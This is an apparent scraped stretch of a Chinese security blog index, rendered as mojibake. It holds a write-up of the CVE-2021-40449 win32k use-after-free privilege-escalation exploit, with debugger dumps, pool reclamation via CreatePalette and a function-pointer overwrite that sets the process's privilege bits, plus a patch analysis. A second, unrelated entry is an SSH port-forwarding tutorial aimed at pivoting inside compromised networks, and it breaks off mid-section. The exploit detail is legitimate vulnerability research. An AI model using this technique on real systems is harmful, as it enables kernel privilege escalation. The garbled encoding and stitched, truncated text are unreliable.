å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„ä¸ºç¬¬äºŒæ¬¡è°ƒç”¨hdcOpenDCWå‡½æ•°è¿”å›çš„å¥æŸ„ï¼Œä½†ä¹‹å‰äº¤æ¢è¿‡æ–°æ—§å¥æŸ„ï¼Œæ‰€ä»¥å®é™…ä¸Šé‡Šæ”¾çš„æ˜¯æ—§HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nä¹‹å‰è®¡ç®—å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬çŸ¥é“DCO +0x30æ˜¯æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åœ¨è°ƒç”¨win32kfull!_imp_bDeleteDCInternalå‡½æ•°ä¹‹åï¼ŒåŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾ï¼Œè¾¾æˆäº†use-after-freeçš„ç¬¬ä¸€æ­¥freeã€‚\nfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DCå¯¹è±¡çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œå¤§å°ä¸ºe30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu ä¹‹ååªéœ€è¦ç”³è¯·è¿™å—å†…å­˜ç©ºé—´å¹¶æ„é€ ï¼Œåˆšåˆ é™¤çš„æ—¶å€™ï¼Œè™½ç„¶DCå¯¹è±¡å·²ç»è¢«é‡Šæ”¾ï¼Œä½†å‡½æ•°æŒ‡é’ˆè¿˜æ˜¯æŒ‡å‘æ­£ç¡®çš„å‡½æ•°åœ°å€ï¼Œæ¥ä¸‹æ¥å°±è¦ç”³è¯·ç©ºé—´ï¼Œè¦†ç›–è¿™å—å†…å­˜ç©ºé—´çš„å‡½æ•°æŒ‡é’ˆçš„å€¼å³å¯ã€‚\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆ ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use éƒ¨åˆ† æ³¨ï¼šæ­¤éƒ¨åˆ†ä¸ºç¬¬äºŒæ¬¡è°ƒè¯•ï¼Œæ‰€ä»¥å¥æŸ„ã€å†…å­˜åœ°å€å’Œå‰éƒ¨åˆ†ä¸ä¸€æ ·ã€‚\nåœ¨pocé‡Œé¢ä¼šè°ƒç”¨CreatePaletteå‡½æ•°ï¼Œè¯¥æ­¤å‡½æ•°ä¼šç”³è¯·å†…æ ¸å †ï¼Œ\nç¬¬ä¸€ä¸ªå¥æŸ„rcx=0000000015213372\n// ç¬¬ä¸€ä¸ªDCOå¯¹è±¡ 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // ç¬¬ä¸€ä¸ªPDC æŒ‡å‘DCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // ç¬¬ä¸€ä¸ªDCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 ç¬¬äºŒä¸ªå¥æŸ„rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 åœ¨DeleteDCInternelè°ƒç”¨ä¹‹åç¬¬ä¸€ä¸ªDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾\n0: kd\u0026gt; !pool ffff885e`80063030 // æ³¨æ„ï¼Œæ­¤æ—¶DCå¯¹è±¡åœ°å€è·ç¦»å †å¤´åœ°å€ä¸º0x30å¤§å° Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm æ ¹æ®è°ƒè¯•ï¼Œå¯ä»¥å¾—çŸ¥é‡Šæ”¾çš„DCå¯¹è±¡å†…å­˜å¤§å°ä¸º0xe30ï¼Œæ‰€ä»¥è¦è¦†ç›–å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œæ‰€ç”³è¯·çš„å†…å­˜ä¹Ÿè¦åˆšåˆšå¥½æˆ–è€…æ¥è¿‘è¿™å—å†…å­˜å¤§å°æ‰æœ‰å¯èƒ½ç”³è¯·åˆ°ã€‚åœ¨pocé‡Œé¢ï¼Œä½¿ç”¨CreatePaletteç”³è¯·è¿™å—å†…æ ¸å †ã€‚è¿™ä¸ªå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å‡½æ•°win32kfull!NtGdiCreatePaletteInternalï¼Œè¯¥å‡½æ•°è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePaletteåˆ›é€ Paletteå¯¹è±¡ï¼Œwin32kbase!PALMEMOBJ::bCreatePaletteä¼šè°ƒç”¨AllocateObjectä¸ºæ–°å¯¹è±¡ç”³è¯·ç©ºé—´ï¼Œæœ€ç»ˆé€šè¿‡è°ƒç”¨ExAllocatePoolWithTagå‡½æ•°åˆ†é…å †ç©ºé—´ï¼Œæ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPoolä»£ç å¦‚ä¸‹ï¼Œæœ€ç»ˆæ˜¯é€šè¿‡è°ƒç”¨ExAllocatePoolWithTagç”³è¯·å †ï¼Œwin32kbase!Win32AllocPoolçš„a1å‚æ•°ä¸ºè¦ç”³è¯·çš„å †å†…å­˜å¤§å°ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥å¾—çŸ¥å…¶è¦ç”³è¯·0xe20å¤§å°çš„å †ï¼ŒåŠ ä¸Šå †å¤´ï¼Œåˆšå¥½æ¥è¿‘åˆšé‡Šæ”¾çš„0xe3å¤§å°çš„å †ç©ºé—´å¤§å°ã€‚\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } åŒæ—¶åœ¨Pocä»£ç åˆ†æé‡Œé¢åˆ†æäº†DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆå’Œå †å¤´ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼Œæ‰€ä»¥é€šè¿‡æ„é€ ä¼ å…¥CreatePaletteçš„LOGPALETTEç»“æ„å¯ä»¥åˆšåˆšå¥½è¦†ç›–åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆä»¥åŠè¯¥å‡½æ•°æŒ‡é’ˆè¦è°ƒç”¨çš„å‚æ•°ï¼Œå†…å­˜åˆ†å¸ƒå…·ä½“è§https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp é‡Œé¢çš„æ³¨é‡Šã€‚\né€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨RtlSetAllBitså‡½æ•°å¹¶ä¼ å…¥RtklBitMapå‹æŒ‡é’ˆï¼Œå…¶ä¸­RtlBitMapçš„bufferæŒ‡å‘POCè¿›ç¨‹è‡ªèº«çš„æƒé™ä½ï¼Œå¦‚ä¸‹å›¾ï¼š\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // æ­¤å¤„ä¸ºRtlBitMapåœ°å€ ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// æ­¤å¤„å­˜æ”¾äº†RtlBitMapç»“æ„ï¼Œ0x00-0x08ä¸ºsizeï¼Œ0x08-0x10ä¸ºbufferæŒ‡é’ˆï¼ŒæŒ‡å‘äº†è‡ªèº«çš„æƒé™ä½ ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c è°ƒç”¨DCé‡Œé¢çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ï¼Œè‡ªèº«æƒé™ä½ä¸ºæ­£å¸¸æƒé™ã€‚\nè°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æƒé™ä½å…¨éƒ¨ç½®ä¸ºäº†1\nè¡¥ä¸åˆ†æ åœ¨æ¼æ´åˆ©ç”¨åˆ†æé‡Œé¢åˆ†æè¿‡æ¼æ´å½¢æˆåŸå› æ˜¯å› ä¸ºåœ¨è°ƒç”¨GreResetDCInternalå‡½æ•°æ—¶ï¼Œä½¿ç”¨DCå¯¹è±¡æŒ‡é’ˆçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚è€Œåˆ©ç”¨è¯¥æ¼æ´æ˜¯é€šè¿‡åœ¨è°ƒç”¨å›è°ƒå‡½æ•°æ—¶è°ƒç”¨ResetDCå®ç°çš„ã€‚\næˆ‘ä»¬å†æ¬¡å›é¡¾ä¸€ä¸‹æ¼æ´å‡½æ•°ï¼Œåœ¨è°ƒç”¨hdcOpenDCWä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨å›è°ƒå‡½æ•°ä¹‹å‰ä¼šé€šè¿‡DCOçš„æ„é€ å‡½æ•°ä»DCæ„é€ DCOå¯¹è±¡ï¼Œåœ¨åŸºæœ¬æ¦‚å¿µä¸­çŸ¥é“ï¼Œå†…æ ¸å¯¹è±¡æ¯è¢«å¼•ç”¨ä¸€æ¬¡åˆ™å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨å€¼ä¼šåŠ ä¸€ã€‚è°ƒç”¨æ„é€ å‡½æ•°æ—¶ï¼ŒDCå¯¹è±¡å¼•ç”¨åŠ ä¸€ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ­¤æ—¶DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¦ä¸º1ã€‚å¦‚æœåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCï¼Œåˆ™ä¼šç¬¬äºŒæ¬¡è°ƒç”¨GreResetDCInternalï¼Œå†æ¬¡è°ƒç”¨DCOçš„æ„é€ å‡½æ•°ï¼ŒDCå¯¹è±¡å¼•ç”¨å†æ¬¡åŠ ä¸€ï¼Œæ­¤æ—¶å¼•ç”¨æ¬¡æ•°ä¸º2ã€‚\næ‰€ä»¥åˆ¤æ–­DCå¯¹è±¡å¼‚å¸¸å¯ä»¥é€šè¿‡åˆ¤æ–­DCå¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°å®ç°ã€‚\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // åˆ é™¤äº†hdcOpenDCWåˆ†é…çš„HDCï¼Œä½†å‰é¢ç»è¿‡HmgSwapLockedHandleContentsäº¤æ¢äº†å¥æŸ„ï¼Œå®é™…åˆ é™¤çš„æ˜¯æ—§çš„HDC Â·Â·Â·Â·Â·Â· åœ¨è¡¥ä¸ä¸­ï¼Œå¢åŠ äº†å¯¹DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œå¦‚æœåœ¨GreResetDCInternalå‡½æ•°ä¸­DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°å¤§äº1åˆ™è¡¨æ˜å·²ç»å‘ç”Ÿå¼‚å¸¸ï¼Œè¿›å…¥å¼‚å¸¸é€»è¾‘æŠ›å‡ºé”™è¯¯(å› ä¸ºæŒ‰æ­£å¸¸æµç¨‹æ­¤å¤„DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°åº”ä¸ºä¸åº”è¯¥å¤§äº1)ã€‚\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } å‚è€ƒé“¾æ¥ï¼š\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSHéš§é“","tags":[],"description":"","content":"SSHéš§é“ SSHæä¾›äº†ä¸‰ç§è½¬å‘æ¨¡å¼ï¼šæœ¬åœ°ç«¯å£è½¬å‘ã€è¿œç¨‹ç«¯å£è½¬å‘ä»¥åŠåŠ¨æ€ç«¯å£è½¬å‘ï¼Œæœ¬æ–‡å°†ä»‹ç»è¿™ä¸‰ç§è½¬å‘æ¨¡å¼çš„ç”¨æ³•ã€‚\nä¸€äº›åŸºæœ¬æ¦‚å¿µ æœ¬åœ°ä¸»æœºï¼šSSHå®¢æˆ·ç«¯æ‰€åœ¨çš„ä¸»æœºã€‚\nè¿œç¨‹ä¸»æœºï¼šç›¸å¯¹äºæœ¬åœ°ä¸»æœºçš„æ¦‚å¿µï¼Œåœ¨æœ¬åœ°ä¸»æœºä¹‹å¤–çš„ä¸»æœºå«è¿œç¨‹ä¸»æœºã€‚\nSSHå‘½ä»¤è¡Œå‚æ•°è§£é‡Š\n-C:å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ -f:å°†sshè½¬å…¥åå°æ‰§è¡Œ -N:å»ºç«‹é™é»˜è¿æ¥ï¼ˆè¿æ¥åçœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰ -g:å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ -L:æœ¬åœ°ç«¯å£è½¬å‘ -R:è¿œç¨‹ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ï¼Œå³å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœºä¸Šï¼Œå‘½ä»¤æ ¼å¼ï¼šssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d åœ¨SSH Clientè¿è¡Œå‘½ä»¤ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ï¼Œå°†127.0.0.1:1313ç«¯å£è½¬å‘åˆ°SSH Serverçš„127.0.0.1:1313ç«¯å£ä¸Šã€‚æ­¤æ—¶SSH Clientè®¿é—®127.0.0.1:1313çš„ç»“æœè·Ÿè®¿é—®åœ¨SSH Serverç«¯çš„127.0.0.1:1313ç»“æœä¸€æ ·ã€‚\nåœ¨SSH Clientä¸Š\næ­¤æ—¶åœ¨SSH Clientä¸Šçš„sshä¼šç›‘å¬127.0.0.1:1313è¿™ä¸ªç«¯å£ï¼Œè¯¥ç«¯å£çš„TCPæ•°æ®é€šè¿‡sshéš§é“ä¼ è¾“åˆ°SSH serverä¸Šã€‚\nåœ¨SSH Serverä¸Šï¼Œå…ˆç›‘å¬127.0.0.1:1313ç«¯å£ï¼Œæœ¬æ–‡ç›‘å¬ä½¿ç”¨hugo å¯åŠ¨ä¸€ä¸ªserverã€‚\nåœ¨SSH Clientä¸Šä½¿ç”¨curl 127.0.0.1:1313å‘½ä»¤æ—¶è¿”å›çš„å†…å®¹å³ä¸ºSSH Serverä¸Š127.0.0.1:1313çš„å†…å®¹\nåŒæ—¶æœ¬åœ°ç«¯å£è½¬å‘å‘½ä»¤ä¸­remote ipä¸æ­¢é™åˆ¶åœ¨127.0.0.1ä¸Šï¼Œremote ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Serverèƒ½å¤Ÿè¿æ¥çš„hostï¼Œå®é™…ä¸Šæœ¬åœ°ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œå®é™…ä¸Šæ˜¯æŠŠSSH Serverå½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå’ŒSSH Serverå¦å¤–ä¸€ç«¯çš„ä¸»æœºï¼Œå¦‚ä¸‹ï¼š\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Clientä¸èƒ½è®¿é—®ä½†æ˜¯SSH Serverèƒ½è®¿é—®çš„ä¸»æœº|\næœ¬åœ°ç«¯å£è½¬å‘ä¸€èˆ¬åº”ç”¨åœºæ™¯ä¸ºåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æ§åˆ¶äº†ç›®æ ‡ç½‘ç»œä¸­å¸¦æœ‰SSH Serverçš„ä¸€å°æœºå™¨ï¼Œé€šè¿‡è¿™å°æœºå™¨åšä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœºä¸Šçš„æœåŠ¡ã€‚ä¸€å®šç¨‹åº¦ä¸Šè§„é¿é˜²ç«å¢™çš„æµé‡å‘Šè­¦ï¼ˆå› ä¸ºsshæµé‡ä¸ºåŠ å¯†æµé‡ï¼‰\nè¿œç¨‹ç«¯å£è½¬å‘ã€‚ è¿œç¨‹ç«¯å£è½¬å‘å³å’Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯ç›¸åçš„æ¦‚å¿µï¼Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ç«¯å£ä¸Šï¼Œè¿æ¥æœ¬åœ°ç«¯å£å³è·Ÿè¿æ¥è¿œç¨‹ç«¯å£ä¸€ä¸ªæ•ˆæœã€‚è€Œè¿œç¨‹ç«¯å£è½¬å‘å³å°†è¿œç¨‹ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼Œä½¿å¾—è¿æ¥è¿œç¨‹ç«¯å£å³è·Ÿè¿æ¥æœ¬åœ°ç«¯å£ä¸€æ ·ã€‚å‘½ä»¤æ ¼å¼ï¼šssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d æœ¬æ¬¡æˆ‘ä»¬å°†SSH Clientçš„3389ç«¯å£è½¬å‘åˆ°SSH Serverï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰ä¸Šï¼Œä½¿å¾—å¦å¤–ä¸€å°æœºå™¨èƒ½å¤Ÿé€šè¿‡SSH Serverçš„ç«¯å£è¿æ¥åˆ°ä½äºå±€åŸŸç½‘çš„SSH Clientçš„è¿œç¨‹æ¡Œé¢ã€‚\nåœ¨ssh clientä¸Šè¿è¡Œå‘½ä»¤\næ­¤æ—¶ä»»ä½•è¿æ¥SSH Server:9898çš„è¯·æ±‚éƒ½ä¼šè¢«è½¬å‘åˆ°SSH Clientçš„58989ç«¯å£ä¸Šï¼Œè¯¥ç«¯å£ç›‘å¬çš„æœåŠ¡ä¸ºè¿œç¨‹æ¡Œé¢æœåŠ¡ã€‚åœ¨å¦å¤–ä¸€å°ç”µè„‘ï¼ˆä¸åŒäºSSH Serverå’ŒSSH Clientï¼‰ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥SSH Server:9898\nåŒæœ¬åœ°ç«¯å£è½¬å‘ä¸€æ ·ï¼Œè¿œç¨‹ç«¯å£è½¬å‘å‘½ä»¤ä¸­çš„local ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Clientèƒ½å¤Ÿè¿æ¥çš„hostï¼Œæ­¤æ—¶SSH Clientè¢«å½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå¦å¤–ä¸€ç«¯å’ŒSSH Serverç«¯çš„ä¸»æœºã€‚\n|SSH Serveèƒ½å¤Ÿè¿é€šçš„ä¸»æœº| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Clientèƒ½è®¿é—®ä½†æ˜¯SSH Serverä¸èƒ½è®¿é—®çš„ä¸»æœº|\nè¿œç¨‹ç«¯å£è½¬å‘åº”ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯å°†å±€åŸŸç½‘çš„æŸäº›æœåŠ¡é€šè¿‡SSHéš§é“æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œæˆ–è€…åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæ§åˆ¶äº†å†…ç½‘çš„æŸå°ä¸»æœºï¼Œé€šè¿‡è¿œç¨‹ç«¯å£è½¬å‘ï¼Œå°†è¯¥ä¸»æœºä½œä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–æœåŠ¡ï¼Œå› ä¸ºæ­¤æ—¶SSHæ˜¯ä»å†…ç½‘è¿æ¥åˆ°å¤–ç½‘ï¼Œåœ¨æµé‡ä¸Šæ²¡æœ‰é‚£ä¹ˆå¯ç–‘ã€‚\nåŠ¨æ€ç«¯å£è½¬å‘ 